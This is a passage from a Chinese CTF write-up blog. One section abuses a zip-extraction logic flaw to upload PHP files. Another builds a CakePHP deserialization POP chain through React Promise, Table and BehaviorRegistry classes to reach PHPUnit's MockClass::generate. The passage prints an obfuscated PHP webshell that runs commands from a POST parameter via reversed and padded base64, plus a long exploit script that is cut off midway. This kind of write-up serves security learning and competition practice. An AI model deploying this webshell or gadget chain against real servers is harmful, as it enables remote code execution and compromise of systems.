&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.html?status=file_error&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>unzip函数里面有个逻辑漏洞，在extractTo()解压zip时如果出错了，就会关闭zip流，并且跳过else语句，而check_extension函数和rename函数就是在else里面，这样就跳过了这两个函数，直接将临时文件夹中的文件移到uoload&#x2F;suimages目录下。</p>
<p>所以我们只需要将我们要留下的文件放在zip中的第一个的位置，将解压时会报错的文件放第二个。这样就能成功将php文件写入目标服务器中</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506251741721.png" alt="image-20250625174113571"></p>
<p>修改第二个文件的文件名(这里文件名必须只有&#x2F;,不能有其他字母，.txt都要换成&#x2F;)</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506251742144.png"></p>
<p>成功上传</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506251759540.png" alt="image-20250625175916452"></p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202506251759954.png" alt="image-20250625175900869"></p>
<p>官方payload,利用了php中base64解码的包容性，会忽略无法识别的字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;edoced_46esab&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="string">&#x27;c3~@#@#@lz!@dGVt&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$b</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sys</span>;</span><br><span class="line"><span class="variable">$s</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="SU-POP"><a href="#SU-POP" class="headerlink" title="SU_POP"></a>SU_POP</h2><p>配了两个小时的环境…</p>
<p>给的exp没mysql服务，db是我自己加的</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">../</span></span><br><span class="line">    <span class="comment"># image: test</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;10021:80&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">  </span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql:5.7</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">MYSQL_DATABASE:</span> <span class="string">my_app</span></span><br><span class="line">      <span class="attr">MYSQL_USER:</span> <span class="string">my_app</span></span><br><span class="line">      <span class="attr">MYSQL_PASSWORD:</span> <span class="string">secret</span></span><br></pre></td></tr></table></figure>

<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507061219667.png" alt="image-20250706121949436"></p>
<p>原来容器之间还能这样用host</p>
<p>给了一个反序列化入口</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507080834113.png" alt="image-20250708083417986"></p>
<p>上网搜索了一下cakephp是有pop链子的，但是题目所用的版本太高了之前的链子不能直接拿来用。</p>
<p>入口点需要换一下。</p>
<p>全局搜索__destruct,发现RejectedPromise调用了__toString<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507080846714.png" alt="image-20250708084608612"></p>
<p>可以调用__call（这个__call和下面的call都是原漏洞链子中的类）</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507080853543.png" alt="image-20250708085308472"></p>
<p>任意方法调用</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507080854292.png" alt="image-20250708085407172"></p>
<p>因为是无参调用的__call,所以php引擎在给__call传递参数时args这个参数是null,我们找的sink点也是要无参的。</p>
<p>MockClass#generate</p>
<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/202507080901148.png" alt="image-20250708090107020"></p>
<h3 id="脚本构造"><a href="#脚本构造" class="headerlink" title="脚本构造"></a>脚本构造</h3><p>重学了一下php反序列化，感觉php反序列化跟Java比起来有点草率，只管全限定名字对不对，没有SerializeUID这些东西。好像反序列化时也不管序列化字符串的属性跟自己源码的属性是不是一个修饰符，拿来就反序列化。</p>
<p>我的答辩exp(可以去看infernity师傅的，很简洁)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">React</span>\<span class="title class_">Promise</span>\<span class="title class_">Internal</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">React</span>\<span class="title">Promise</span>\<span class="title">PromiseInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">function</span> <span class="title">React</span>\<span class="title">Promise</span>\<span class="title">_checkTypehint</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">function</span> <span class="title">React</span>\<span class="title">Promise</span>\<span class="title">resolve</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">RejectedPromise</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$reason</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handled</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handled) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$handler</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">set_rejection_handler</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$handler</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$message</span> = <span class="string">&#x27;Unhandled promise rejection with &#x27;</span> . <span class="variable language_">$this</span>-&gt;reason;</span><br><span class="line"></span><br><span class="line">            \<span class="title function_ invoke__">error_log</span>(<span class="variable">$message</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$handler</span>(<span class="variable language_">$this</span>-&gt;reason);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Throwable</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            \<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([^:\s]++)(.*+)$/sm&#x27;</span>, (<span class="keyword">string</span>) <span class="variable">$e</span>, <span class="variable">$match</span>);</span><br><span class="line">            \<span class="title function_ invoke__">assert</span>(<span class="keyword">isset</span>(<span class="variable">$match</span>[<span class="number">1</span>], <span class="variable">$match</span>[<span class="number">2</span>]));</span><br><span class="line">            <span class="variable">$message</span> = <span class="string">&#x27;Fatal error: Uncaught &#x27;</span> . <span class="variable">$match</span>[<span class="number">1</span>] . <span class="string">&#x27; from unhandled promise rejection handler&#x27;</span> . <span class="variable">$match</span>[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">            \<span class="title function_ invoke__">error_log</span>(<span class="variable">$message</span>);</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">255</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;reason = <span class="keyword">new</span> <span class="title class_">Response</span>();</span><br><span class="line">        &#125;<span class="function"><span class="keyword">function</span> <span class="title">set_rejection_handler</span>(<span class="params">?<span class="keyword">callable</span> <span class="variable">$callback</span></span>): ?<span class="title">callable</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$current</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="variable">$previous</span> = <span class="variable">$current</span>;</span><br><span class="line">    <span class="variable">$current</span> = <span class="variable">$callback</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$previous</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">Http</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">Configure</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Cookie</span>\<span class="title">CookieCollection</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Cookie</span>\<span class="title">CookieInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Exception</span>\<span class="title">NotFoundException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Table</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">DateTime</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">DateTimeInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">DateTimeZone</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">InvalidArgumentException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Laminas</span>\<span class="title">Diactoros</span>\<span class="title">MessageTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Laminas</span>\<span class="title">Diactoros</span>\<span class="title">Stream</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Http</span>\<span class="title">Message</span>\<span class="title">ResponseInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Http</span>\<span class="title">Message</span>\<span class="title">StreamInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">SplFileInfo</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Stringable</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">function</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">env</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">function</span> <span class="title">Cake</span>\<span class="title">I18n</span>\<span class="title">__d</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$stream</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;stream-&gt;<span class="title function_ invoke__">rewind</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;stream-&gt;<span class="title function_ invoke__">getContents</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;stream = <span class="keyword">new</span> <span class="title class_">Table</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">ORM</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">ArrayObject</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">BadMethodCallException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Collection</span>\<span class="title">CollectionInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">App</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">Configure</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">Exception</span>\<span class="title">CakeException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Database</span>\<span class="title">Connection</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Database</span>\<span class="title">Exception</span>\<span class="title">DatabaseException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Database</span>\<span class="title">Expression</span>\<span class="title">QueryExpression</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Database</span>\<span class="title">Schema</span>\<span class="title">TableSchemaInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Database</span>\<span class="title">TypeFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Datasource</span>\<span class="title">ConnectionManager</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Datasource</span>\<span class="title">EntityInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Datasource</span>\<span class="title">Exception</span>\<span class="title">InvalidPrimaryKeyException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Datasource</span>\<span class="title">RepositoryInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Datasource</span>\<span class="title">RulesAwareTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Event</span>\<span class="title">EventDispatcherInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Event</span>\<span class="title">EventDispatcherTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Event</span>\<span class="title">EventListenerInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Event</span>\<span class="title">EventManager</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Association</span>\<span class="title">BelongsTo</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Association</span>\<span class="title">BelongsToMany</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Association</span>\<span class="title">HasMany</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Association</span>\<span class="title">HasOne</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Exception</span>\<span class="title">MissingEntityException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Exception</span>\<span class="title">PersistenceFailedException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Exception</span>\<span class="title">RolledbackTransactionException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Query</span>\<span class="title">DeleteQuery</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Query</span>\<span class="title">InsertQuery</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Query</span>\<span class="title">QueryFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Query</span>\<span class="title">SelectQuery</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Query</span>\<span class="title">UpdateQuery</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Rule</span>\<span class="title">IsUnique</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Utility</span>\<span class="title">Inflector</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Validation</span>\<span class="title">ValidatorAwareInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Validation</span>\<span class="title">ValidatorAwareTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Closure</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Exception</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">InvalidArgumentException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Name</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">SimpleCache</span>\<span class="title">CacheInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">ReflectionFunction</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">ReflectionNamedType</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">function</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">deprecationWarning</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">function</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">namespaceSplit</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Table</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> BehaviorRegistry <span class="variable">$_behaviors</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$method</span>, <span class="keyword">array</span> <span class="variable">$args</span></span>): <span class="title">mixed</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;_behaviors-&gt;<span class="title function_ invoke__">hasMethod</span>(<span class="variable">$method</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_behaviors-&gt;<span class="title function_ invoke__">call</span>(<span class="variable">$method</span>, <span class="variable">$args</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^find(?:\w+)?By/&#x27;</span>, <span class="variable">$method</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_dynamicFinder</span>(<span class="variable">$method</span>, <span class="variable">$args</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(</span><br><span class="line">            <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Unknown method `%s` called on `%s`&#x27;</span>, <span class="variable">$method</span>, <span class="built_in">static</span>::<span class="variable language_">class</span>),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_behaviors = <span class="keyword">new</span> <span class="title class_">BehaviorRegistry</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Cake</span>\<span class="title class_">ORM</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">ObjectRegistry</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">ORM</span>\<span class="title">Exception</span>\<span class="title">MissingBehaviorException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">LogicException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PHPUnit</span>\<span class="title">Event</span>\<span class="title">Code</span>\<span class="title">Throwable</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Generator</span>\<span class="title">MockClass</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">React</span>\<span class="title">Promise</span>\<span class="title">Internal</span>\<span class="title">RejectedPromise</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BehaviorRegistry</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">array</span> <span class="variable">$_methodMap</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">array</span> <span class="variable">$_loaded</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$mockClass</span> = <span class="keyword">new</span> <span class="title class_">MockClass</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_methodMap = [<span class="string">&quot;rewind&quot;</span>=&gt;[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;generate&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_loaded = [<span class="string">&quot;a&quot;</span>=&gt;<span class="variable">$mockClass</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasMethod</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$method</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$method</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$method</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;_methodMap[<span class="variable">$method</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$method</span>, <span class="keyword">array</span> <span class="variable">$args</span> = []</span>): <span class="title">mixed</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$method</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$method</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">hasMethod</span>(<span class="variable">$method</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$this</span>-&gt;_methodMap[<span class="variable">$method</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">            [<span class="variable">$behavior</span>, <span class="variable">$callMethod</span>] = <span class="variable language_">$this</span>-&gt;_methodMap[<span 